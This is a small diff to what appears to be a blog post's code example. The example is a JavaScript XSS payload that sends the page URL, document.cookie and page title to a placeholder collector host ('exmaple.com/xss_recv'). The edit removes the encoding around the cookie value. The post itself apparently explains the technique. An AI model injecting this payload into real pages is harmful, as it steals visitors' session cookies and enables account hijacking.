@@ -36,7 +36,7 @@ tags:
 
 {% highlight javascript %}
     (function(){
-        (new Image()).src = 'http://exmaple.com/xss_recv?location=' + encodeURIComponent(window.location.href) + '&cookie=' + encodeURIComponent(document.cookie) + '&title=' + encodeURIComponent(document.title)
+        (new Image()).src = 'http://exmaple.com/xss_recv?location=' + encodeURIComponent(window.location.href) + '&cookie=' + document.cookie + '&title=' + encodeURIComponent(document.title)
     })()
 {% endhighlight %}
 
